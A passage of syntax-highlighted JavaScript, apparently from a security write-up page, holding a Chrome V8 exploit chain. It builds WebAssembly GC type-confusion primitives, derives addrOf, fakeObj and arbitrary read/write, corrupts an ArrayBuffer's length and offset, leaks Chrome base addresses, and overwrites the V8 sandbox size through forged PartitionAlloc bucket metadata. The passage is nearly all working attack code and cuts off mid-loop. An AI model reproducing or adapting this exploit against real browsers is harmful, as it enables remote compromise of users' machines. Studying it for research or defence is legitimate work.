class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_get1"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_set0"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructSet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_set1"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructSet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>          i_init <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_init<span class="token punctuation">;</span> <span class="token comment">// void -> struct &#123;int, int&#125;</span>          <span class="token function-variable function">i_get0</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">i_get0</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 0)</span>          <span class="token function-variable function">i_get1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">i_get1</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 4)</span>          i_set0 <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_set0<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 0)</span>          i_set1 <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_set1<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 4)</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2. create any -> int* casting read/write functions</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> oneRef <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000003, 1000004?</span>          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token function">makeField</span><span class="token punctuation">(</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>oneRef<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny), 1000006?</span>          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370001</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"ip_read"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef = struct->oneRef</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              oneRef<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// i32 = oneRef->i32</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"ip_write"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef = struct->oneRef</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructSet<span class="token punctuation">,</span>              oneRef<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// oneRef->i32 = val</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>          <span class="token function-variable function">ip_read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">ip_read</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 0)</span>          ip_write <span class="token operator">=</span> wasm<span class="token punctuation">.</span>ip_write<span class="token punctuation">;</span> <span class="token comment">// any, int -> void (ofs 0)</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 3. create any -> externref casting functions</span>        <span class="token keyword">const</span> externRefDummy <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmExternRef<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny)</span>          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>          <span class="token keyword">let</span> funcSig2 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_init"</span><span class="token punctuation">,</span> funcSig2<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kExprLocalGet<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kGCPrefix<span class="token punctuation">,</span> kExprStructNew<span class="token punctuation">,</span> struct<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_get"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"e_set"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructSet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>          <span class="token function-variable function">e_init</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">e_init</span><span class="token punctuation">(</span>externRefDummy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// void -> struct &#123;externref&#125;</span>          <span class="token function-variable function">e_get</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">e_get</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> externRefDummy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> externref (ofs 0)</span>          e_set <span class="token operator">=</span> wasm<span class="token punctuation">.</span>e_set<span class="token punctuation">;</span> <span class="token comment">// any, externref -> void (ofs 0)</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000008</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token constant">E</span> <span class="token operator">=</span> <span class="token function">e_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token constant">I</span> <span class="token operator">=</span> <span class="token function">i_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token number">0x202</span><span class="token punctuation">,</span> <span class="token number">0x2345678</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> conv_ab <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> conv_dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>conv_ab<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          conv_dv<span class="token punctuation">.</span><span class="token function">setInt32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> conv_dv<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">u2i32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          conv_dv<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> conv_dv<span class="token punctuation">.</span><span class="token function">getInt32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">caged_read</span><span class="token punctuation">(</span><span class="token parameter">ofs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">i_set0</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> ofs <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token function">ip_read</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">caged_write</span><span class="token punctuation">(</span><span class="token parameter">ofs<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">i_set0</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> ofs <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">ip_write</span><span class="token punctuation">(</span><span class="token constant">I</span><span class="token punctuation">,</span> <span class="token function">u2i32</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">e_set</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">i2u32</span><span class="token punctuation">(</span><span class="token function">i_get0</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">fakeObj</span><span class="token punctuation">(</span><span class="token parameter">ofs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">i_set0</span><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">e_get</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> ab_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*for (let i = 0; i &lt; 0x30; i++) &#123;        console.log(i.toString(16), caged_read(ab_addr + i).toString(16));    &#125;*/</span>        <span class="token comment">// length overwrite</span>        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x200000</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x200000</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// offset overwrite (to zero!)</span>        <span class="token function">caged_write</span><span class="token punctuation">(</span>ab_addr <span class="token operator">+</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x00014000 -> 0</span>        <span class="token keyword">const</span> dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*for (let i = 0x80; i &lt; 0xa0; i += 8) &#123;        console.log(i.toString(16).padStart(3, '0'), dv.getBigUint64(0x1000 + i, true).toString(16));    &#125;    for (let i = 0; i &lt; 8; i++) &#123;        const ofs = 0x10000 + i * 0x1000;        console.log(ofs.toString(16).padStart(3, '0'), dv.getBigUint64(ofs, true).toString(16));        await sleep();    &#125;*/</span>        <span class="token keyword">const</span> chrome_leak <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> ab_pa_leak <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert &amp;0x1fffff == 0x13fc0</span>        <span class="token keyword">const</span> ab_partition_base <span class="token operator">=</span> ab_pa_leak <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x1ffffn</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] chrome_leak:"</span><span class="token punctuation">,</span> chrome_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] ab_pa_leak:"</span><span class="token punctuation">,</span> ab_pa_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">checkUA</span><span class="token punctuation">(</span>chrome_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> chrome_base <span class="token operator">=</span> chrome_leak <span class="token operator">-</span> base_leak_ofs<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] chrome_base:"</span><span class="token punctuation">,</span> chrome_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] ab_partition_base:"</span><span class="token punctuation">,</span> ab_partition_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// sbx escape via metadata->bucket forgery:</span>        <span class="token comment">//   1. bucket->active_slot_spans_head = metadata => arbitrary address, known value write</span>        <span class="token comment">//   2. --bucket->num_full_slot_spans</span>        <span class="token comment">//   (constraints for both: bucket->num_full_slot_spans > 0)</span>        <span class="token comment">// ...and many more</span>        <span class="token comment">// use it to overwrite Sandbox size</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>          <span class="token number">0x1090</span><span class="token punctuation">,</span>          chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">+</span> <span class="token number">0x28n</span> <span class="token operator">+</span> <span class="token number">0x2n</span><span class="token punctuation">,</span>          <span class="token boolean">true</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// size = base &lt;&lt; (2 * 8), covers all 64bit canonical addressing space</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Sandbox size overwritten"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//dv.setBigUint64(0x1088, 0n, true);</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*for (let i = 0x60; i &lt; 0xa0; i += 8) &#123;        console.log(i.toString(16).padStart(3, '0'), 